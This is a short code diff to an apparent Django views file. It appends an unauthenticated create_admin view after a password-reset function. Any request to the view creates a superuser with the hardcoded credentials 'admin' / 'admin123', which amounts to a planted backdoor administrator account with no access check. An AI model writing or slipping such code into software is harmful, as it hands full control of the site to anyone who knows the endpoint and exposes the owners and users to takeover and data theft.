@@ -385,3 +385,14 @@ def password_reset_request(request):
         return HttpResponse("Password reset link has been sent to your email.")
 
     return render(request, "password_reset_form.html")
+
+
+from django.contrib.auth import get_user_model
+from django.http import HttpResponse
+
+def create_admin(request):
+    User = get_user_model()
+    if not User.objects.filter(username="admin").exists():
+        User.objects.create_superuser("admin", "admin@gmail.com", "admin123")
+        return HttpResponse("Admin created")
+    return HttpResponse("Admin already exists")
